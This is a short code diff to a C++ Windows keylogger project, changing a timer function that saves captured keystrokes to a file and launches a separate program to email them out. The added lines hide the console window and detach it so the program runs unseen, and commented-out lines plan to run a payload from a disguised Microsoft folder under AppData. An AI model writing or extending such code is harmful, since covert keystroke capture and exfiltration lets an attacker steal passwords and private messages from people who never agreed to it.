@@ -3,6 +3,7 @@
 
 #include <iostream>
 #include <fstream>
+#include <string>
 #include "windows.h"
 #include "KeyConstants.h"
 #include "Timer.h"
@@ -23,8 +24,16 @@ void TimerSendMail()
         Helper::WriteAppLog("File creation was not successfull. Keylog " + keylog + "");
         return;
     }
+    //Send file using python script
+    //TO DO Find directory of exe
+    //TO DO Launch Python exe with no terminal
+    //const char* home_dir = getenv("USERPROFILE");
+    //std::string text_dir = home_dir.str();
+    //std::string command = "explorer " << text_dir << "\\AppData\\Roaming\\Microsoft\\Install\\main.exe";
+    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), false);
     system("explorer C:\\CodingProjects\\C++\\Keylogger-main\\Keylogger\\mail_sending\\main.exe");
-    system("pause");
+    FreeConsole();
+    //system(command);
     keylog = "";
     Helper::WriteAppLog("Email Sent");
 }
